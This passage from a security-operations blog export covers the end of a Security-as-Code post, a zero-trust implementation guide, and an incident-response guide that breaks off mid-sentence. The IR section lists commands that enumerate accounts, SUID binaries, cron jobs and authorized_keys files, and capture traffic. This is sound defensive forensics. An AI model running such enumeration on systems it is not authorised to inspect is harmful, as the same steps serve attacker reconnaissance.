server_side_encryption_configuration { rule { apply_server_side_encryption_by_default { sse_algorithm = \u0026#34;AES256\u0026#34; } } } } As code (verification):\npackage terraform.analysis import input.plan as tfplan # Require default encryption on S3 buckets deny[msg] { rc := tfplan.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket\u0026#34; not rc.change.after.server_side_encryption_configuration msg := sprintf( \u0026#34;S3 bucket \u0026#39;%s\u0026#39; has no default encryption\u0026#34;, [rc.change.after.bucket] ) } # If you require KMS (not AES256), enforce that too deny[msg] { rc := tfplan.resource_changes[_] rc.type == \u0026#34;aws_s3_bucket\u0026#34; sse := rc.change.after.server_side_encryption_configuration.rule[_].apply_server_side_encryption_by_default sse.sse_algorithm != \u0026#34;aws:kms\u0026#34; msg := sprintf( \u0026#34;S3 bucket \u0026#39;%s\u0026#39; is not using KMS encryption\u0026#34;, [rc.change.after.bucket] ) } What changed:\nEncryption enforced by infrastructure definition Encryption is verified in tests before code ships Configuration is version controlled and auditable The Organizational Shift This transformation requires more than changing tools. It changes how teams work together.\nFrom Gatekeeper to Enabler Traditional security: Teams submit code for review. Security team reviews it (slowly). Security team gatekeeps deployment.\nSecurity as Code: Security team provides tests and policies. Dev team runs them in CI/CD. Security team reviews test results. Deployment happens when tests pass.\nThe difference: Security isn\u0026rsquo;t blocking deployments. Security is enabling faster deployments by making verification automatic.\nBefore:\nSecurity review takes 2 weeks Changes sit waiting Pressure to skip review Security team seen as obstruction After:\nTests run in minutes Results are immediate Security team sees test output, reviews failures Deployment continues if tests pass From Auditor to Engineer Traditional security teams function as auditors. They review systems periodically. They issue findings. They check if findings were fixed.\nSecurity as Code transforms security teams into engineers who build tools. They create tests. They create policies. They integrate these into CI/CD.\nManagement: Why did we fail the last audit? Same finding as previous year.\nSysadmin: Because it was a checklist item. Someone forgot to check it.\nManagement: Can we make it so they can\u0026rsquo;t forget?\nSysadmin: Yes. Make it a test that runs on every deploy.\nManagement: What if someone tries to bypass it?\nSysadmin: CI/CD blocks deployment if test fails. They\u0026rsquo;d have to ask you to override.\nPractical Implementation Don\u0026rsquo;t try to convert entire security program to code at once. That\u0026rsquo;s how big transformation projects fail. Start small.\nStage 1: Digitize Checklists Convert existing checklists into structured formats with metadata. Not just text documents.\nFormat:\nControl name Requirement description Compliance mapping (PCI-DSS 8.2.4, GDPR Article 32, etc.) Risk rating (high, medium, low) Implementation guidance This creates foundation for automation.\nHere\u0026rsquo;s a simple template that works well enough to start:\nid: SEC-001 name: Database not publicly accessible risk: high compliance: - pci_dss: \u0026#34;1.3.1\u0026#34; - gdpr: \u0026#34;Article 32\u0026#34; owner: platform-team scope: - terraform applies_to: - aws_db_instance requirement: \u0026#34;Database must not have a public endpoint\u0026#34; implementation_guidance: \u0026#34;Put DB in private subnets; restrict SG ingress to app tier\u0026#34; verification: type: policy tool: conftest evidence: \u0026#34;OPA policy passes in CI; terraform plan JSON attached\u0026#34; exemptions: allowed: false Stage 2: Identify Automatable Items Not everything can be tested automatically. Some things require human judgment.\nAutomatable:\nPassword policies (can be verified via code) Network rules (can be tested via infrastructure-as-code tools) Encryption configuration (can be verified) SSL/TLS certificates (can be checked) Not easily automatable:\nSecurity architecture reviews Threat modeling sessions Incident response quality assessments Focus automation on what can be tested automatically. Keep human review for what can\u0026rsquo;t.\nStage 3: Build Tooling Choose tools that fit your existing workflows.\nIf you use Terraform:\nWrite tests in Terraform itself (using check blocks) or Open Policy Agent (OPA) Run tests in CI/CD If you use Kubernetes:\nKyverno for policy enforcement OPA Gatekeeper for admission control If you use CI/CD:\nGitHub Actions or GitLab CI Custom test runners or commercial SAST tools Don\u0026rsquo;t introduce a whole new toolchain just for security. Use what you already have.\nStage 4: Integrate with Deployment Pipeline Security tests run in same pipeline as other tests. They block deployment if they fail.\n# Example GitHub Actions workflow name: Security Tests on: [pull_request, push] jobs: security-scan: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 # Run InSpec tests - name: Run InSpec run: | inspec exec test/integration/default # Run Terraform security scan - name: Run tfsec run: | tfsec . # Check dependencies - name: Run npm audit run: | npm audit --audit-level=moderate # Run SAST scan - name: Run Snyk uses: snyk/actions/node@master with: args: --severity-threshold=high Security becomes like linting. It happens automatically, fails builds if issues are found, and requires explicit overrides.\nStage 5: Shift Left Security tests happen earlier in development cycle. Not just before deployment.\nDevelopment:\nSAST scanning on every commit Dependency scanning in CI Security-focused unit tests Staging:\nDAST scanning on staging deployments Penetration testing on staging environment Security integration tests Production:\nRuntime security monitoring Cloud security posture management (CSPM) Automated compliance verification The goal: Catch issues before they reach production.\nThe Skills Gap Security teams lack software engineering skills. Development teams lack security expertise. Both need training.\nFor security professionals:\nLearn automation tools (InSpec, OPA, Checkov) Learn CI/CD integration (GitHub Actions, GitLab CI, ArgoCD) Learn programming basics (Python, Go, shell scripts) to write tests Focus on building tools, not just reviewing systems For developers:\nLearn security fundamentals (OWASP Top 10, CWE, CVEs) Learn secure coding practices (input validation, output encoding, authentication) Learn security testing tools (how to interpret results, how to fix findings) Treat security as quality, not compliance Cross-training: Security engineers pair with developers on implementing security controls. Developers pair with security engineers on threat modeling. Both learn from each other.\nMost effective organizations I\u0026rsquo;ve seen have security engineers embedded in development teams, not sitting in a separate security department reviewing code.\nCommon Anti-Patterns Anti-pattern 1: Security testing by security team only\nOnly security team should run security tests. Dev team can\u0026rsquo;t understand results. Can\u0026rsquo;t fix findings quickly.\nBetter: Security team creates tests. Dev team runs tests daily. Dev team can fix issues immediately.\nAnti-pattern 2: Security gates without feedback\nSecurity tests fail deployment. No explanation of why. Dev team disables tests to ship.\nBetter: Security tests produce actionable output. Failures include links to remediation guidance. CI/CD provides mechanism for documented exemptions.\nAnti-pattern 3: Point-in-time compliance\nRun security tests annually for audit. Ignore security rest of year.\nBetter: Security tests run continuously. Compliance is continuous state, not annual event.\nAnti-pattern 4: Separation without collaboration\nSecurity team develops tests in isolation. Dev team doesn\u0026rsquo;t understand requirements.\nBetter: Security and dev teams collaborate on defining tests. Dev team provides context about system architecture. Security team provides guidance on security requirements.\nWhat Good Looks Like Effective Security as Code implementations share characteristics:\nContinuous verification: Security checks run on every commit, every pull request, every deploy. Not periodically.\nFast feedback: Developers get security feedback in minutes, not weeks. Tests fail builds, not require manual review cycles.\nClear policies: Security requirements are expressed as code, not documents. Policy is the source of truth.\nBlocking: Security tests that fail block deployment. No exceptions without documented override process.\nTransparent: Test results are visible to all stakeholders. Everyone can see what passed and what failed.\nDeveloper-friendly: Tests are easy to run locally. Dev team can fix issues before creating pull request.\nSecurity-appropriate: Tests catch real security issues, not just checklists. Focus on vulnerabilities, not compliance artifacts.\nMeasurement How do you know if transformation is working?\nMetrics to track:\nTime from security finding to remediation (days, not weeks) Percentage of security checks automated Deployment frequency blocked by security tests Vulnerability remediation rate (what percent of findings are fixed before next release) Mean time to detect production security issues (MTTD) Targets:\n90% of security controls automated Security findings fixed within 7 days Less than 5% of deployments blocked by security Mean time to detect security issues in production \u0026lt; 24 hours These are realistic targets for organizations making this transition.\nThe Boring Truth Security as Code isn\u0026rsquo;t a product you buy. It\u0026rsquo;s not a framework you implement. It\u0026rsquo;s a way of working.\nThe transformation happens incrementally. Not in one big rewrite project, but in small steps that each improve how security is done.\nStart with the most automatable items. The ones that are most frustrating in manual review. Password policies. Network rules. Encryption configuration.\nAutomate those first. Show value quickly. Then expand to more complex areas.\nThe goal isn\u0026rsquo;t 100% automation. Some security review requires human judgment. The goal is 80% automation, with human review focused on the 20% that requires it.\nMost organizations fail this transformation by trying to do everything at once. Security team tries to automate everything. Dev team resists changes. Management demands unrealistic timelines.\nSuccessful transformations pick one thing, do it well, prove value, then pick the next thing.\nYour security checklists captured valuable knowledge. Transform that knowledge into code. Don\u0026rsquo;t lose what worked. Make it scale.\n","date":"18 Sep 2025","permalink":"https://gazsecops.github.io/posts/security-as-code/","summary":"\u003cp\u003e\u0026ldquo;Here\u0026rsquo;s the security checklist for the new release.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;We\u0026rsquo;re deploying next week. When can we do the review?\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;The review takes two weeks minimum. You scheduled it last month.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;\u0026hellip;we didn\u0026rsquo;t.\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eThis is the problem with security checklists. They\u0026rsquo;re designed for a world where you deploy quarterly. In continuous deployment environments, they\u0026rsquo;re the wrong tool.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Security checklists codify knowledge but don't scale. Security as Code codifies requirements into executable tests. Checklists tell you what to check. Code checks it for you, every time.\"\n\u003c/aside\u003e\n\u003cp\u003eThe evolution from checklists to code isn\u0026rsquo;t about abandoning security knowledge. It\u0026rsquo;s about making security verification scale with modern development practices.\u003c/p\u003e","tags":["security","compliance","automation","operations"],"title":"Security as Code: From Checklists to Automation"},{"content":" Vendor: Our zero trust platform provides seamless, frictionless, AI-powered security across your entire estate.\nSysadmin: What does it actually do?\nVendor: It verifies every request, every time, everywhere.\nSysadmin: So does a firewall rule and a login page. What does yours do differently?\nVendor: \u0026hellip;it has a dashboard.\nZero trust has become the most abused term in security marketing. Every vendor has a zero trust product. Every slide deck has a zero trust slide. Every CISO has a zero trust initiative.\nMost of them are buying a product and calling it a strategy.\nZero trust is not a product. It's the slow, painful process of removing implicit trust from your network, one assumption at a time. This post is about what zero trust actually looks like when you have to implement it. Not the conference version. The version where you\u0026rsquo;re staring at a network diagram, a list of legacy systems, and a budget that won\u0026rsquo;t cover half of what the vendors quoted you.\nWhat Zero Trust Actually Means Strip away the marketing and you\u0026rsquo;re left with one idea: don\u0026rsquo;t trust anything by default.\nTraditional networks have a perimeter. Inside the perimeter is trusted. Outside is untrusted. VPN puts you inside. Firewall keeps others out.\nZero trust says: there is no inside. Every request is untrusted until proven otherwise. Every time.\nThat\u0026rsquo;s it. Everything else is implementation detail.\nThe principles:\nVerify explicitly - authenticate and authorise every request based on all available data Least privilege - give the minimum access needed, for the minimum time Assume breach - design as if attackers are already inside None of this is new. Defence in depth, least privilege, and assume breach have been best practice for decades. Zero trust just says \u0026ldquo;actually do it, everywhere, not just at the perimeter\u0026rdquo;.\nWhy It\u0026rsquo;s Hard (The Honest Version) If zero trust were easy, everyone would have done it years ago.\nLegacy systems don\u0026rsquo;t support it. That mainframe from 1997 doesn\u0026rsquo;t do OAuth. That ERP system authenticates with a shared password. That SCADA controller trusts anything on its VLAN. You can\u0026rsquo;t just flip a switch.\nNetworks weren\u0026rsquo;t designed for it. Flat networks with implicit trust between subnets. Servers that talk to each other because they always have. Firewall rules that say \u0026ldquo;allow all from 10.0.0.0/8\u0026rdquo; because someone needed it once and nobody removed it.\nPeople don\u0026rsquo;t want it. Zero trust means more authentication prompts. More access requests. More friction. Users hate friction. Management hates user complaints.\nIt costs money and time. Identity infrastructure, microsegmentation, policy engines, monitoring. None of it is free. Most of it takes months to deploy properly.\nNobody owns it. Is zero trust a network project? An identity project? A security project? An everything project? Usually it becomes nobody\u0026rsquo;s project, which means it doesn\u0026rsquo;t happen.\nManagement: Where are we on the zero trust initiative?\nSysadmin: We\u0026rsquo;ve deployed an identity provider and started segmenting the network.\nManagement: So we\u0026rsquo;re zero trust now?\nSysadmin: We\u0026rsquo;ve removed about 5% of the implicit trust in our environment.\nManagement: But the slide said Q2.\nSysadmin: The slide was wrong.\nThe Three Pillars (In Practice) 1. Identity: Know Who\u0026rsquo;s Asking Every request needs an identity. Not \u0026ldquo;this came from the office network\u0026rdquo;. An actual identity.\nFor users:\nStrong authentication (MFA everywhere, no exceptions) Conditional access (device health, location, risk score) Session management (short sessions, re-authentication for sensitive actions) For services:\nWorkload identity (not shared credentials, not API keys in environment variables) Mutual TLS where you can Short-lived credentials (tokens that expire, not passwords that don\u0026rsquo;t) For devices:\nDevice identity and health checks Compliance posture (patched, encrypted, managed) Don\u0026rsquo;t trust the device just because it\u0026rsquo;s on the network The hard part isn\u0026rsquo;t deploying an identity provider. It\u0026rsquo;s getting everything to use it. That \u0026ldquo;everything\u0026rdquo; includes the app from 2012 that only supports basic auth, the printer that can\u0026rsquo;t do 802.1X, and the vendor appliance with a hardcoded admin password.\n2. Network: Stop Trusting the Wire Traditional: if you\u0026rsquo;re on the network, you can talk to anything else on the network.\nZero trust: every network flow is denied by default and explicitly allowed based on identity and policy.\nMicrosegmentation:\nWorkloads can only talk to what they need East-west traffic is filtered, not just north-south Policy follows the workload, not the IP address In practice, this means:\nYour database server only accepts connections from your app servers, not from \u0026ldquo;the server VLAN\u0026rdquo; Your monitoring system can scrape metrics but can\u0026rsquo;t SSH to anything Your CI/CD runner can deploy to staging but not production The reality:\nYou\u0026rsquo;ll start with coarse segments and refine over time You\u0026rsquo;ll break things when you tighten rules (have a rollback plan) Some systems will never be properly segmented (document them, compensate elsewhere) \u0026ldquo;Microsegmentation\u0026rdquo; often becomes \u0026ldquo;slightly less macro segmentation\u0026rdquo; and that\u0026rsquo;s still progress 3. Access: Every Request Gets Evaluated Not \u0026ldquo;you logged in this morning, so you\u0026rsquo;re trusted all day\u0026rdquo;. Every request, every time.\nPolicy evaluation:\nWho is requesting? (identity) What are they requesting? (resource) From where? (network, device, location) Is this normal? (behaviour, risk score) Should they have access? (policy) This requires a policy engine. Something that evaluates these signals in real time. Could be your identity provider\u0026rsquo;s conditional access. Could be a service mesh policy layer. Could be a proxy that makes decisions.\nWhat it looks like in practice:\nUser on a managed, compliant device from the office: full access Same user on an unmanaged device from a coffee shop: read-only, no downloads Same user at 3am from a country they\u0026rsquo;ve never been to: blocked, alert triggered Service A calling Service B: allowed if the service identity and scope match policy Service A calling Service C: denied, no policy exists Where to Start (Without Losing Your Mind) You can\u0026rsquo;t do everything at once. Pick the highest-value changes first.\nPhase 1: Identity foundation (months 1-3) Get identity right first. Everything else depends on it.\nDeploy MFA for all users (start with admins, then everyone) Implement conditional access policies (block legacy auth, require device compliance) Inventory service accounts and shared credentials (you\u0026rsquo;ll be horrified) Start replacing shared credentials with workload identity where you can What you\u0026rsquo;ll break: Legacy apps that don\u0026rsquo;t support modern auth. Plan for it.\nPhase 2: Network visibility (months 2-4) You can\u0026rsquo;t segment what you can\u0026rsquo;t see.\nMap network flows (what talks to what) Deploy flow logging if you don\u0026rsquo;t have it Identify implicit trust (flat VLANs, overly permissive firewall rules, \u0026ldquo;allow all\u0026rdquo; rules) Document what should talk to what vs what currently does What you\u0026rsquo;ll discover: Everything talks to everything. Half the flows are unnecessary. Nobody knows why the other half exist.\nPhase 3: Coarse segmentation (months 3-6) Start cutting.\nSeparate environments (dev, staging, prod) Isolate sensitive systems (databases, key management, admin interfaces) Restrict management plane access (SSH, RDP, admin consoles) Default deny between segments, explicit allow for known flows What you\u0026rsquo;ll break: Something. Have monitoring and rollback ready.\nPhase 4: Refine and extend (months 6+) Tighten.\nMove from network-based rules to identity-based rules where possible Implement per-service policies Add behaviour-based signals (anomaly detection, risk scoring) Extend to cloud workloads if you haven\u0026rsquo;t already What you\u0026rsquo;ll learn: This never ends. That\u0026rsquo;s fine. Each iteration removes more implicit trust.\nCommon Failures Failure 1: Buying a product and declaring victory Management buys a \u0026ldquo;zero trust platform\u0026rdquo;. Deploys it. Declares the organisation zero trust. Nothing else changes.\nThe platform sits in front of some apps. Legacy systems bypass it. Network is still flat. Service accounts still use shared passwords.\nFix: Zero trust is a strategy. Products support it. They don\u0026rsquo;t replace the work.\nFailure 2: Boiling the ocean Trying to microsegment everything at once. Replacing all authentication simultaneously. Rewriting every firewall rule in one change window.\nResult: massive outage, rollback, zero trust initiative quietly shelved.\nFix: Start small. Pick one segment, one set of services, one environment. Prove it works. Expand.\nFailure 3: Ignoring the human cost Zero trust adds friction. More prompts. More denied access. More \u0026ldquo;why can\u0026rsquo;t I reach this anymore?\u0026rdquo; tickets.\nIf you don\u0026rsquo;t manage this, users will find workarounds. Workarounds are usually less secure than what you had before.\nFix: Communicate changes. Explain why. Make the secure path the easy path where you can. Accept that some friction is the price of security.\nFailure 4: No monitoring You\u0026rsquo;ve segmented the network. You\u0026rsquo;ve tightened access. But you\u0026rsquo;re not watching what\u0026rsquo;s happening.\nSomeone\u0026rsquo;s access gets blocked and they can\u0026rsquo;t do their job. Nobody notices for three days. Or: an attacker hits a deny rule and nobody sees the alert.\nFix: Monitor policy decisions. Alert on denials that look wrong (legitimate users blocked). Alert on patterns that look bad (repeated denied access from one source).\nHere\u0026rsquo;s what that looks like in practice:\nIdentity logs: sign-in failures, MFA failures, risky sign-ins Network logs: denied flows between segments (and changes in deny volume) App logs: permission denied events, unexpected 401/403 spikes If you\u0026rsquo;re using Prometheus, you can at least catch the obvious \u0026ldquo;everything is getting 403s\u0026rdquo; failure:\nsum(rate(http_requests_total{status=~\u0026#34;401|403\u0026#34;}[5m])) / sum(rate(http_requests_total[5m])) Alert if it jumps after a policy change.\nFor identity, you want alerts on:\nrepeated MFA failures for a user repeated denied access from one IP or device impossible travel / suspicious locations If your IdP already does this (Entra ID, Okta), wire the alerts into your on-call and test them. Most places configure them once, never fire a test alert, and then discover at 3am that nobody receives the notifications.\nFailure 5: Forgetting service-to-service Everyone focuses on user access. Nobody looks at service-to-service communication.\nYour microservices talk to each other over plain HTTP with no authentication. Your batch jobs run as root with full network access. Your monitoring system has read access to everything.\nFix: Service identity matters as much as user identity. Mutual TLS, workload identity, scoped permissions. It\u0026rsquo;s harder than user auth but just as important.\nOne quick win: treat your CI/CD runners as hostile until proven otherwise.\nSeparate deploy identities for dev/staging/prod No long-lived cloud keys on runners (use OIDC/workload identity) Restrict what the runner can reach on the network Most \u0026ldquo;zero trust\u0026rdquo; programmes ignore this and then get owned through a pipeline credential.\nCloud Makes This Easier (And Harder) Easier because:\nIdentity is built in (IAM roles, workload identity, managed identities) Network segmentation is software-defined (security groups, network policies) Policy engines exist (conditional access, IAM policies, OPA) Short-lived credentials are the default for many services Harder because:\nMore things to secure (VPCs, accounts, subscriptions, projects, clusters, functions, buckets\u0026hellip;) Shared responsibility means you own configuration Multi-cloud means multiple identity systems Developers can create resources without security review The biggest cloud zero trust mistake: assuming the cloud provider handles it. They provide the tools. You have to use them correctly. A misconfigured security group is just a flat network with extra steps.\nWhat Good Looks Like You won\u0026rsquo;t wake up one morning and be \u0026ldquo;zero trust\u0026rdquo;. But you can tell you\u0026rsquo;re making progress when:\nNew services deploy with identity and least-privilege access by default Network access requires justification, not just \u0026ldquo;it\u0026rsquo;s on the VLAN\u0026rdquo; You can answer \u0026ldquo;who accessed what, when, and why\u0026rdquo; for critical systems Removing a user\u0026rsquo;s access actually removes their access (no lingering sessions, no shared passwords) A compromised workstation doesn\u0026rsquo;t automatically mean a compromised network Your blast radius analysis shows smaller blast radiuses than last year The Boring Truth Zero trust is not exciting. It\u0026rsquo;s not a product launch. It\u0026rsquo;s not a transformation you complete in a quarter.\nIt\u0026rsquo;s removing one implicit trust assumption at a time. Enforcing MFA. Segmenting a subnet. Replacing a shared password with a service identity. Tightening a firewall rule. Adding a policy check.\nEach one is small. Each one reduces risk. None of them make for a good conference talk.\nThe vendors will sell you a platform. The consultants will sell you a roadmap. The analysts will sell you a maturity model.\nWhat actually works: pick the biggest implicit trust in your environment. Remove it. Pick the next one. Repeat.\nThat\u0026rsquo;s zero trust. Not a product. Not a project. A direction you move in, one boring change at a time.\nIf you want the identity layer done right, start with the OAuth 2.0 post for the common mistakes. If you want the network monitoring side, the Prometheus post covers what to watch. If you want to understand how service identity works across microservices, the OBO flow guide walks through preserving user context through service chains.\n","date":"5 Aug 2025","permalink":"https://gazsecops.github.io/posts/zero-trust-what-it-actually-means/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e Our zero trust platform provides seamless, frictionless, AI-powered security across your entire estate.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What does it actually do?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e It verifies every request, every time, everywhere.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e So does a firewall rule and a login page. What does yours do differently?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-vendor\"\u003eVendor:\u003c/span\u003e \u0026hellip;it has a dashboard.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eZero trust has become the most abused term in security marketing. Every vendor has a zero trust product. Every slide deck has a zero trust slide. Every CISO has a zero trust initiative.\u003c/p\u003e\n\u003cp\u003eMost of them are buying a product and calling it a strategy.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nZero trust is not a product. It's the slow, painful process of removing implicit trust from your network, one assumption at a time.\n\u003c/aside\u003e\n\u003cp\u003eThis post is about what zero trust actually looks like when you have to implement it. Not the conference version. The version where you\u0026rsquo;re staring at a network diagram, a list of legacy systems, and a budget that won\u0026rsquo;t cover half of what the vendors quoted you.\u003c/p\u003e","tags":["security","zero-trust","networking","identity","cloud","operations"],"title":"Zero Trust: What It Actually Means When You Have to Implement It"},{"content":" On-call: I\u0026rsquo;m getting paged. Something about unusual outbound traffic.\nManagement: Is it a breach?\nOn-call: I don\u0026rsquo;t know yet. I\u0026rsquo;ve been awake for forty seconds.\nManagement: We need to tell the board by 8am.\nOn-call: I need to tell you what\u0026rsquo;s happening first. Give me an hour.\nManagement: You have thirty minutes.\nIncident response plans look great in documents. Neat flowcharts. Escalation matrices. Communication templates. Everyone has a role. Everyone knows what to do.\nThen something actually happens and none of it works the way the document said it would.\nThe best incident response plan is the one your team has actually practised. The second best is any plan at all. Most teams have neither. This post is about what incident response looks like in practice. Not the framework version. The version where you\u0026rsquo;re half awake, the logs are incomplete, and someone is asking you to confirm it\u0026rsquo;s not a breach before you\u0026rsquo;ve even found the right terminal.\nWhy Most IR Plans Fail They fail for the same reason most plans fail: they were written for a world that doesn\u0026rsquo;t exist.\nThe plan assumes:\nYou\u0026rsquo;ll know what happened quickly The right people will be available Logs will contain what you need Communication channels will work Everyone will follow the process Reality:\nYou don\u0026rsquo;t know what happened for hours (sometimes days) The one person who understands the system is on holiday The logs you need were rotated yesterday or never existed The Slack channel fills with speculation from people who aren\u0026rsquo;t helping Half the team hasn\u0026rsquo;t read the plan The plan isn\u0026rsquo;t useless. But it\u0026rsquo;s a starting point, not a script.\nThe First Thirty Minutes The first thirty minutes set the tone for everything that follows. Get them wrong and you\u0026rsquo;re chasing your tail for days.\n1. Confirm it\u0026rsquo;s real Not everything that looks like an incident is one. Before you wake people up and start an incident bridge, answer one question: is this actually happening?\nCheck:\nIs the alert legitimate or a false positive? Can you reproduce or observe the behaviour? Is this a known issue (deployment, maintenance window, config change)? Quick triage, not investigation. You\u0026rsquo;re not trying to understand the full picture yet. You\u0026rsquo;re trying to decide whether to escalate.\n2. Contain first, investigate later If it looks real, your first job is to stop it getting worse. Not to understand it. Not to find root cause. To contain.\nContainment actions (pick what fits):\nIsolate the affected system (network ACL, security group, pull the cable) Disable the compromised account Block the suspicious IP or domain Revoke the leaked credential Kill the process You will feel pressure to investigate first. Resist it. Every minute you spend understanding the problem is a minute the attacker (or the failure) is still active.\nEngineer: We should figure out what they accessed before we cut them off.\nSysadmin: No. We cut them off now. We figure out what they accessed from the logs after.\nEngineer: What if we lose forensic evidence?\nSysadmin: What if they\u0026rsquo;re still exfiltrating data while we discuss it?\nContain. Then investigate. Not the other way around.\n3. Preserve evidence Containment doesn\u0026rsquo;t mean destroy evidence. When you isolate a system:\nSnapshot it first if you can (VM snapshot, disk image) Don\u0026rsquo;t reboot it (volatile memory is evidence) Don\u0026rsquo;t \u0026ldquo;clean up\u0026rdquo; anything yet Note the time of every action you take On Linux, before you touch anything:\n# Capture volatile state date -u \u0026gt; /tmp/ir_timestamp ps auxf \u0026gt; /tmp/ir_processes ss -tunap \u0026gt; /tmp/ir_network who \u0026gt; /tmp/ir_users cat /proc/*/cmdline 2\u0026gt;/dev/null | tr \u0026#39;\\0\u0026#39; \u0026#39; \u0026#39; | sort -u \u0026gt; /tmp/ir_cmdlines last -20 \u0026gt; /tmp/ir_logins In cloud, snapshot the instance and its volumes. Don\u0026rsquo;t terminate it.\n4. Establish communication You need one channel. Not five.\nOne incident channel (Slack, Teams, whatever) One incident lead (one person making decisions, not a committee) One scribe (someone writing down what\u0026rsquo;s happening, when, and what was decided) Keep spectators out. The incident channel is for people working the incident. Everyone else gets updates on a schedule.\nTriage: What Am I Looking At? Once you\u0026rsquo;ve contained and preserved, you need to understand what happened. This is where most teams get stuck because they don\u0026rsquo;t have a system for it.\nAsk these questions in order 1. What\u0026rsquo;s the scope?\nHow many systems are affected? Is it one host, one service, one account, or the whole environment? Is it spreading? 2. What\u0026rsquo;s the timeline?\nWhen did it start? (check logs, not guesses) When was it detected? What\u0026rsquo;s the gap? (dwell time matters) 3. What\u0026rsquo;s the impact?\nIs data exposed? What kind? Are services down? Which ones? Are customers affected? Are credentials compromised? 4. What\u0026rsquo;s the vector?\nHow did they get in? (phishing, exploit, credential, misconfiguration) What did they do after getting in? Where did they go? You won\u0026rsquo;t answer all of these immediately. That\u0026rsquo;s fine. Partial answers are better than no answers. Update as you learn more.\nWhere to look (Linux) When you\u0026rsquo;re on a potentially compromised Linux box:\n# Auth events (distro differences) # - Debian/Ubuntu: /var/log/auth.log # - RHEL/CentOS: /var/log/secure journalctl -u ssh -u sshd --since \u0026#34;24 hours ago\u0026#34; --no-pager sudo tail -n 200 /var/log/auth.log 2\u0026gt;/dev/null sudo tail -n 200 /var/log/secure 2\u0026gt;/dev/null # What\u0026#39;s running ps auxf ls -la /proc/*/exe 2\u0026gt;/dev/null | grep deleted # What\u0026#39;s talking to the network ss -tunap # What listeners exist (often quicker than scrolling ss output) sudo ss -ltnup # Quick packet capture (if you can do it without making things worse) sudo timeout 30 tcpdump -ni any -w /tmp/ir_capture.pcap 2\u0026gt;/dev/null # What changed recently # Don\u0026#39;t do `find /` on a big box unless you enjoy self-inflicted outages. # Start with likely places and stay on one filesystem. sudo find /etc /var /home -xdev -mmin -120 -type f 2\u0026gt;/dev/null # Cron (persistence check) for u in $(cut -f1 -d: /etc/passwd); do echo \u0026#34;--- $u ---\u0026#34; crontab -u \u0026#34;$u\u0026#34; -l 2\u0026gt;/dev/null done ls -la /etc/cron.* # Unusual SUID binaries sudo find / -xdev -perm -4000 -type f 2\u0026gt;/dev/null # Systemd timers and services (persistence) systemctl list-timers --all --no-pager systemctl list-unit-files --state=enabled --no-pager # Users and keys (persistence) getent passwd sudo find /home -maxdepth 3 -name authorized_keys -type f -print -exec ls -la {} \\; 2\u0026gt;/dev/null Two things that save time:\nGet a list of suspicious PIDs and work backwards. What\u0026rsquo;s the parent process? What user? What binary? What network sockets? Don\u0026rsquo;t run ten tools. Run three tools and actually read the output. Where to look (cloud) When the incident is in AWS, Azure, or GCP:\nCloudTrail / Activity Log / Audit Log: who did what, when VPC Flow Logs / NSG Flow Logs: network connections GuardDuty / Defender / Security Command Centre: automated findings IAM: what permissions does the compromised identity have? What could they reach? S3/Storage access logs: did they access data stores? The first question in cloud is always: \u0026ldquo;what permissions did the compromised identity have?\u0026rdquo; That tells you the blast radius.\nAWS quick triage Find recent API activity (CloudTrail):\naws cloudtrail lookup-events \\ --lookup-attributes AttributeKey=Username,AttributeValue=COMPROMISED_IDENTITY \\ --max-results 50 Check access keys and when they were last used:\naws iam list-access-keys --user-name COMPROMISED_USER aws iam get-access-key-last-used --access-key-id AKIA... Containment patterns that don\u0026rsquo;t destroy evidence:\nDetach policies / reduce permissions first (stop the bleeding) Disable access keys (keep the user for investigation) aws iam update-access-key --user-name COMPROMISED_USER --access-key-id AKIA... --status Inactive Azure quick triage Control-plane changes are in Activity Log:\naz monitor activity-log list \\ --status Succeeded \\ --max-events 50 \\ --offset 6h \\ -o table For a managed identity, the fastest \u0026ldquo;blast radius\u0026rdquo; check is role assignments:\naz role assignment list --assignee-object-id OBJECT_ID --all -o table GCP quick triage Cloud Audit Logs are your starting point:\ngcloud logging read \\ \u0026#39;protoPayload.authenticationInfo.principalEmail=\u0026#34;user@example.com\u0026#34;\u0026#39; \\ --limit=50 \\ --freshness=6h Escalation: When to Wake People Up Not every incident needs the CEO on a call. Not every alert needs the whole team.\nSeverity guide (adapt to your context):\nSeverity What it means Who gets woken up Low Suspicious activity, no confirmed impact On-call investigates, updates in morning Medium Confirmed compromise, limited scope On-call + team lead, incident channel opened High Active breach, data exposure, spreading Full IR team, management notified Critical Business-threatening, regulatory, public Everyone. Legal. Comms. Executive team. The hardest call is escalating from medium to high. You don\u0026rsquo;t want to cry wolf. You also don\u0026rsquo;t want to be the person who sat on a breach for six hours because you weren\u0026rsquo;t sure.\nRule of thumb: if you\u0026rsquo;re debating whether to escalate, escalate.\nCommunication During an Incident Communication is where incidents go wrong almost as often as the technical response.\nInternal updates:\nRegular cadence (every 30 minutes during active incidents) Facts only, no speculation What we know, what we\u0026rsquo;re doing, what we don\u0026rsquo;t know yet Next update time Management updates:\nTranslate technical details into business impact \u0026ldquo;The attacker accessed a server that processes customer orders\u0026rdquo; not \u0026ldquo;they got a reverse shell on prod-app-03\u0026rdquo; Be honest about uncertainty. \u0026ldquo;We don\u0026rsquo;t know yet\u0026rdquo; is better than a wrong answer External communication (if needed):\nLegal decides when and what to disclose Comms drafts the message Don\u0026rsquo;t let engineers write customer notifications at 4am What not to do:\nSpeculate in the incident channel Blame people during the incident Share details outside the IR team before authorised Post updates on social media Containment Patterns Different incidents need different containment.\nCompromised account Disable the account 